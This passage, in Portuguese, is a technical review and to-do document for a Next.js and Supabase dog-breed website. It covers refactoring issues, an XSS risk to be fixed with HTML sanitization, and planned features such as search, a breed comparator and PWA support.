#### 1. 🔴 Inconsistência no Cliente Supabase

**Severidade:** MÉDIA

**Problema:**
- `lib/data/pages.ts` usa `lib/supabase.ts` (singleton)
- `lib/data/breeds.ts` cria seu próprio cliente Supabase

**Impacto:**
- Duplicação de código
- Possível inconsistência de configuração
- Dificulta manutenção

**Solução:**
Refatorar `lib/data/breeds.ts` para usar `lib/supabase.ts`:
```typescript
// lib/data/breeds.ts
import { supabase } from "@/lib/supabase"; // ✅ Usar singleton

// Remover:
// const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
// const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;
// const supabase = createClient(supabaseUrl, supabaseKey);
```

#### 2. 🔴 Componentes Legacy Removidos ✅

**Status:** RESOLVIDO

**Correção Realizada:**
- `components/Header.tsx` - Removido ✅
- `components/Footer.tsx` - Removido ✅
- Componentes agora estão apenas em `components/layout/`

#### 3. ✅ Navegação Atualizada

**Status:** IMPLEMENTADO

**Mudança Realizada:**
- Menu "Curiosidades" foi substituído por "Blog" ✅
- Link agora aponta para `/blog` ✅
- Navegação atualizada em `components/layout/Header.tsx` ✅

### Problemas Menores

#### 4. 🟡 Configuração Duplicada no `next.config.ts`

**Severidade:** BAIXA

**Problema:**
Hostname `images.unsplash.com` aparece duplicado com aspas extras na linha 21:
```typescript
hostname: "images.unsplash.com'", // ⚠️ Aspa extra
```

**Solução:**
Remover duplicação e corrigir aspas:
```typescript
{
  protocol: "https",
  hostname: "images.unsplash.com", // ✅ Corrigido
}
```

#### 5. 🟡 Falta de Validação de Tipos em Tempo de Execução

**Severidade:** BAIXA

**Problema:**
Dados do Supabase são assumidos como corretos sem validação.

**Solução:**
Usar bibliotecas de validação (Zod, Yup):
```typescript
import { z } from 'zod';

const PageSchema = z.object({
  id: z.string().uuid(),
  slug: z.string(),
  title: z.string(),
  // ...
});

const page = PageSchema.parse(data);
```

---

## 📋 Pendências e Tarefas

### Tarefas Urgentes (Prioridade Alta)

- [ ] **Corrigir vulnerabilidade XSS** - Implementar sanitização de HTML
  - [ ] Instalar `dompurify` ou `isomorphic-dompurify`
  - [ ] Sanitizar `page.content` antes de renderizar
  - [ ] Atualizar `app/[slug]/page.tsx`
  - [ ] Atualizar `app/not-found.tsx`

- [ ] **Unificar cliente Supabase** - Refatorar `lib/data/breeds.ts`
  - [ ] Remover criação de cliente duplicado
  - [ ] Importar `supabase` de `lib/supabase.ts`
  - [ ] Testar funcionalidade de raças

- [ ] **Validar variáveis de ambiente** - Criar validação
  - [ ] Criar `lib/env.ts` com função `validateEnv()`
  - [ ] Atualizar `lib/supabase.ts`
  - [ ] Adicionar validação no build (via `next.config.ts`)

### Tarefas Importantes (Prioridade Média)

- [x] **Limpar código duplicado** ✅
  - [x] Remover `components/Header.tsx` ✅
  - [x] Remover `components/Footer.tsx` ✅

- [x] **Sistema de Blog implementado** ✅
  - [x] Criar rotas `/blog` e `/blog/[slug]` ✅
  - [x] Criar componente `ArticleCard` ✅
  - [x] Criar interface `Article` ✅
  - [x] Implementar funções `getAllArticles()`, `getFeaturedArticles()`, `getArticleBySlug()` ✅
  - [x] Atualizar página inicial para usar artigos ✅
  - [x] Atualizar navegação (Curiosidades → Blog) ✅
  - [x] Corrigir bug de export não encontrado (`getAllArticles`) ✅
  - [x] Limpar componentes legacy ✅

- [ ] **Corrigir vulnerabilidade XSS no blog**
  - [ ] Implementar sanitização HTML em `app/blog/[slug]/page.tsx`
  - [ ] Instalar `isomorphic-dompurify`

- [ ] **Melhorar tratamento de erros**
  - [ ] Diferenciar tipos de erro (não encontrado vs. conexão)
  - [ ] Implementar logging adequado (Sentry, LogRocket)
  - [ ] Remover `console.error` em produção

- [ ] **Implementar fallback na página 404**
  - [ ] Melhorar tratamento de erro em `app/not-found.tsx`
  - [ ] Garantir que sempre funcione mesmo se Supabase falhar

### Tarefas de Melhoria (Prioridade Baixa)

- [ ] **Adicionar validação de tipos em runtime**
  - [ ] Instalar Zod ou Yup
  - [ ] Criar schemas de validação para `Page` e `Breed`
  - [ ] Validar dados do Supabase

- [ ] **Implementar cache**
  - [ ] Cache de páginas estáticas (ISR)
  - [ ] Cache de raças
  - [ ] Reduzir requisições ao Supabase

- [ ] **Adicionar testes**
  - [ ] Testes unitários para funções de dados
  - [ ] Testes de integração para rotas
  - [ ] Testes E2E para fluxos principais

- [ ] **Melhorar SEO**
  - [ ] Adicionar metadata dinâmica em `app/[slug]/page.tsx`
  - [ ] Adicionar Open Graph tags
  - [ ] Adicionar sitemap.xml
  - [ ] Adicionar robots.txt

- [ ] **Otimizar imagens**
  - [ ] Verificar uso de `unoptimized` (pode impactar performance)
  - [ ] Implementar lazy loading onde apropriado
  - [ ] Usar formato WebP/AVIF

---

## 💡 Novas Ideias e Melhorias

### Funcionalidades Sugeridas

#### 1. 🎯 Sistema de Busca Avançada

**Descrição:** Busca inteligente com filtros múltiplos

**Funcionalidades:**
- Busca por nome, categoria, características
- Filtros por tamanho, energia, facilidade de treinamento
- Ordenação (popularidade, nome, categoria)
- Sugestões de busca (autocomplete)

**Implementação:**
- Criar componente `AdvancedSearch.tsx`
- Implementar filtros no backend (Supabase) ou client-side
- Adicionar debounce na busca

#### 2. 🎯 Comparador de Raças

**Descrição:** Comparar até 3 raças lado a lado

**Funcionalidades:**
- Selecionar múltiplas raças
- Visualização comparativa (tabela ou cards)
- Comparação de estatísticas
- Compartilhamento de comparação (URL)

**Implementação:**
- Rota `/racas/compare?breeds=labrador,golden,husky`
- Componente `BreedComparator.tsx`
- Estado compartilhado via URL query params

#### 3. 🎯 Favoritos de Raças

**Descrição:** Sistema para salvar raças favoritas

**Funcionalidades:**
- Salvar raças favoritas (localStorage ou cookie)
- Página `/favoritos`
- Indicador visual nos cards

**Implementação:**
- Hook customizado `useFavorites()`
- Persistência via localStorage
- Página `/favoritos` para listar favoritos

#### 4. 🎯 Calculadora de Necessidades

**Descrição:** Calcular quantidade de comida, exercício, etc.

**Funcionalidades:**
- Input: raça, peso, idade, nível de atividade
- Output: quantidade de comida diária, minutos de exercício
- Recomendações personalizadas

**Implementação:**
- Rota `/calculadora`
- Componente `NeedsCalculator.tsx`
- Lógica de cálculo baseada em dados da raça

#### 5. 🎯 Blog/Artigos

**Descrição:** Seção de artigos sobre cuidados com cães

**Funcionalidades:**
- Listagem de artigos
- Página de artigo individual
- Categorias (saúde, alimentação, comportamento)
- Busca e filtros

**Implementação:**
- Nova tabela `posts` no Supabase
- Rotas `/blog` e `/blog/[slug]`
- Componentes similares ao sistema de páginas

#### 6. 🎯 Sistema de Avaliações/Reviews

**Descrição:** Usuários podem avaliar raças

**Funcionalidades:**
- Avaliar raças (1-5 estrelas)
- Comentários sobre a raça
- Filtros por avaliação
- Ranking de raças mais bem avaliadas

**Implementação:**
- Tabela `breed_reviews` no Supabase
- Autenticação Supabase (opcional)
- Componente `BreedReviews.tsx`

#### 7. 🎯 Integração com Mapas (Canis/Centros)

**Descrição:** Mapa de canis e centros de adoção próximos

**Funcionalidades:**
- Mapa interativo (Google Maps ou Mapbox)
- Filtros por raça, localização
- Informações de contato

**Implementação:**
- Integração com Google Maps API ou Mapbox
- Componente `BreedLocations.tsx`
- Dados de canis (supabase ou API externa)

#### 8. 🎯 Sistema de Notificações

**Descrição:** Notificações push para novidades

**Funcionalidades:**
- Notificar sobre novas raças adicionadas
- Notificar sobre novos artigos
- Newsletter semanal

**Implementação:**
- Integração com serviço de notificações (OneSignal, Pusher)
- Backend para gerenciar assinaturas

#### 9. 🎯 Modo Escuro (Dark Mode)

**Descrição:** Tema escuro para o site

**Funcionalidades:**
- Toggle para alternar tema
- Persistência da preferência
- Transições suaves

**Implementação:**
- Context API para gerenciar tema
- CSS variables para cores
- localStorage para persistência

#### 10. 🎯 PWA (Progressive Web App)

**Descrição:** Transformar site em app instalável

**Funcionalidades:**
- Instalação no dispositivo
- Funcionalidade offline (cache)
- Ícone na tela inicial

**Implementação:**
- Configuração PWA no `next.config.ts`
- Service Worker para cache
- Manifest.json

### Melhorias Técnicas

#### 1. 🚀 Performance

- **Image Optimization**: Remover `unoptimized` onde possível
- **Code Splitting**: Lazy load de componentes pesados
- **Bundle Analysis**: Analisar tamanho do bundle
- **CDN**: Usar CDN para assets estáticos

#### 2. 🚀 SEO

- **Metadata Dinâmica**: Metadata por rota
- **Structured Data**: Schema.org para raças
- **Sitemap**: Gerar sitemap.xml automaticamente
- **robots.txt**: Configurar crawlers

#### 3. 🚀 Analytics

- **Google Analytics**: Rastreamento de comportamento
- **Supabase Analytics**: Analytics de queries
- **Performance Monitoring**: Lighthouse CI

#### 4. 🚀 Acessibilidade

- **ARIA Labels**: Melhorar labels para leitores de tela
- **Keyboard Navigation**: Navegação completa via teclado
- **Color Contrast**: Verificar contraste de cores
- **Alt Text**: Descrever todas as imagens

---

## ✅ Checklist Técnico

### Segurança

- [ ] ✅ **Implementar sanitização de HTML** (XSS)
- [ ] ✅ **Validar variáveis de ambiente**
- [ ] ✅ **Revisar políticas RLS no Supabase**
- [ ] ✅ **Implementar rate limiting**
- [ ] ✅ **Remover logs sensíveis em produção**

### Código

- [ ] ✅ **Unificar cliente Supabase** (refatorar `breeds.ts`)
- [ ] ✅ **Remover código duplicado** (Header/Footer legacy)
- [ ] ✅ **Corrigir configuração Next.js** (hostname duplicado)
- [ ] ✅ **Remover importações não utilizadas**
- [ ] ✅ **Implementar validação de tipos** (Zod/Yup)

### Funcionalidades

- [ ] ⏳ **Sistema de busca avançada**
- [ ] ⏳ **Comparador de raças**
- [ ] ⏳ **Favoritos de raças**
- [ ] ⏳ **Calculadora de necessidades**
- [x] ✅ **Sistema de blog/artigos** (implementado com dados estáticos)
- [ ] ⏳ **Migrar blog para Supabase**
- [ ] ⏳ **Busca e filtros no blog**
- [ ] ⏳ **Modo escuro**
- [ ] ⏳ **PWA**

### Performance

- [ ] ⏳ **Otimizar imagens** (remover unoptimized)
- [ ] ⏳ **Implementar cache** (ISR)
- [ ] ⏳ **Code splitting** (lazy load)
- [ ] ⏳ **Bundle analysis**

### SEO e Analytics

- [ ] ⏳ **Metadata dinâmica por rota**
- [ ] ⏳ **Structured data** (Schema.org)
- [ ] ⏳ **Sitemap.xml automático**
- [ ] ⏳ **Google Analytics**
- [ ] ⏳ **robots.txt**

### Testes

- [ ] ⏳ **Testes unitários** (funções de dados)
- [ ] ⏳ **Testes de integração** (rotas)
- [ ] ⏳ **Testes E2E** (fluxos principais)

### Documentação

- [x] ✅ **Documentação técnica** (esta documentação)
- [ ] ⏳ **README.md atualizado**
- [ ] ⏳ **Guia de contribuição**
- [ ] ⏳ **Documentação da API** (se houver)

---

## 📊 Resumo Executivo

### Estado Atual do Projeto

✅ **Pontos Fortes:**
- Arquitetura moderna com Next.js 16 App Router
- TypeScript em todo o projeto
- Separação clara de responsabilidades
- Design responsivo e moderno
- Animações suaves com Framer Motion

⚠️ **Pontos de Atenção:**
- Vulnerabilidade XSS no blog (sanitização de HTML)
- Inconsistência no cliente Supabase
- Blog usa dados estáticos (migrar para Supabase no futuro)
- Falta de validação de variáveis de ambiente

### Prioridades Recomendadas

1. **URGENTE**: Corrigir vulnerabilidade XSS no blog
2. **IMPORTANTE**: Unificar cliente Supabase
3. **IMPORTANTE**: Validar variáveis de ambiente
4. **FUTURO**: Migrar blog para Supabase (tabela `articles`)
5. **FUTURO**: Implementar busca e filtros no blog

### Métricas do Projeto

- **Total de Rotas**: 5 rotas
- **Total de Componentes**: 15+ componentes
- **Funções de Dados**: 3 funções principais
- **Tipos/Interfaces**: 2 principais (Page, Breed)
- **Tabelas Supabase**: 2 (pages, breeds)

---

## 📝 Notas Finais

Esta documentação foi gerada através de análise completa do código. Recomendações:

1. **Segurança**: Implementar sanitização de HTML imediatamente
2. **Código**: Refatorar inconsistências (cliente Supabase)
3. **Manutenção**: Limpar código duplicado
4. **Melhorias**: Priorizar funcionalidades baseadas em demanda

**Última atualização:** Dezembro 2024 - Sistema de Blog Implementado  
**Versão do Projeto:** 0.2.0  
**Mudanças Recentes:**
- ✅ Sistema de Blog implementado (rotas, componentes, funções)
- ✅ Navegação atualizada (Curiosidades → Blog)
- ✅ Componentes legacy removidos
- ✅ Integração de artigos na página inicial
- ⚠️ Blog usa dados estáticos (migrar para Supabase no futuro)
- ⚠️ Vulnerabilidade XSS no blog (sanitização necessária)

**Próxima revisão:** Após correção da vulnerabilidade XSS e migração do blog para Supabase

---

**Documentação gerada por:** Análise Técnica Completa  
**Status:** ✅ Completa e Atualizada
